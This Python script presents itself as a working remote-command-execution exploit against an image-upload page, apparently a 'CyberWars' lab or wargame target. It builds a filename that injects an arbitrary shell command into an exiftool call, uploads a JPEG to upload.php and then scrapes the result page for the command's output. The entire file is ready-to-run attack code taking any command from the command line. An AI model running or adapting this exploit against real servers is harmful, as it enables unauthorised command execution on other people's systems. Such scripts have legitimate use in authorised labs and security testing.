#!/usr/bin/env python3
"""
Working RCE exploit using a real JPEG file
"""

import requests
import sys

def exploit_rce(target_url, command="whoami"):
    """Exploit the RCE vulnerability"""
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {command}")
    
    # Create malicious filename with command injection
    malicious_filename = f'test.jpg"; {command}; echo "'
    print(f"[*] Payload: {malicious_filename}")
    
    # Read the valid JPEG file we created
    try:
        with open('test.jpg', 'rb') as f:
            jpeg_data = f.read()
        print(f"[*] Using JPEG file: {len(jpeg_data)} bytes")
    except FileNotFoundError:
        print("[-] Error: test.jpg not found. Run this first:")
        print("python -c \"from PIL import Image; img = Image.new('RGB', (10, 10), color='red'); img.save('test.jpg', 'JPEG', quality=95)\"")
        return False
    
    # Prepare form data
    files = {
        'photo': (malicious_filename, jpeg_data, 'image/jpeg')
    }
    
    data = {
        'title': 'RCE Test',
        'description': 'Testing command injection vulnerability'
    }
    
    try:
        print("[*] Sending exploit...")
        
        response = requests.post(
            f"{target_url}/upload.php",
            files=files,
            data=data,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        
        if response.status_code == 302:
            print("[+] SUCCESS! Upload accepted - command executed!")
            location = response.headers.get('Location', '')
            print(f"[+] Redirected to: {location}")
            
            # Try to fetch the result page to see command output
            if location:
                if not location.startswith('http'):
                    result_url = target_url + ('/' + location if not location.startswith('/') else location)
                else:
                    result_url = location
                
                try:
                    print(f"[*] Fetching result page: {result_url}")
                    result_response = requests.get(result_url, timeout=5)
                    print(f"[*] Result page status: {result_response.status_code}")
                    
                    # Look for metadata section which should contain command output
                    if "metadata" in result_response.text.lower() or "debug_output" in result_response.text.lower():
                        print("[+] Found metadata section!")
                        
                        # Try to extract and show relevant parts
                        lines = result_response.text.split('\n')
                        for i, line in enumerate(lines):
                            if 'metadata' in line.lower() or 'debug' in line.lower():
                                # Show this line and a few after it
                                for j in range(max(0, i-2), min(len(lines), i+10)):
                                    if any(word in lines[j].lower() for word in ['root', 'www-data', 'ubuntu', command]):
                                        print(f"[+] Possible output: {lines[j].strip()}")
                        
                        print(f"\n[+] Check the full page at: {result_url}")
                        print("[+] Look for metadata section containing command output")
                    
                except Exception as e:
                    print(f"[!] Could not fetch result page: {e}")
            
            return True
            
        elif response.status_code == 400:
            print("[-] Upload failed with 400 Bad Request")
            error_text = response.text
            if "bild konnte nicht gelesen werden" in error_text.lower():
                print("[-] Image validation failed - JPEG format issue")
            elif "titel und beschreibung" in error_text.lower():
                print("[-] Missing title or description")
            else:
                print(f"[-] Error: {error_text[:200]}...")
            return False
            
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            print(f"[-] Response: {response.text[:200]}...")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Working RCE Exploit for CyberWars Image Upload")
        print("Usage: python3 working_exploit.py <target_url> [command]")
        print("Example: python3 working_exploit.py http://localhost:8080 whoami")
        print("\nFirst run this to create test.jpg:")
        print("python -c \"from PIL import Image; img = Image.new('RGB', (10, 10), color='red'); img.save('test.jpg', 'JPEG', quality=95)\"")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    # Make sure target URL has http://
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    print("=" * 60)
    print("CyberWars Image Upload RCE Exploit")
    print("=" * 60)
    
    success = exploit_rce(target_url, command)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] Command executed via filename injection in exiftool call")
        print("[+] Check the uploaded image's metadata for command output")
    else:
        print("\n[-] Exploit failed")

if __name__ == "__main__":
    main()
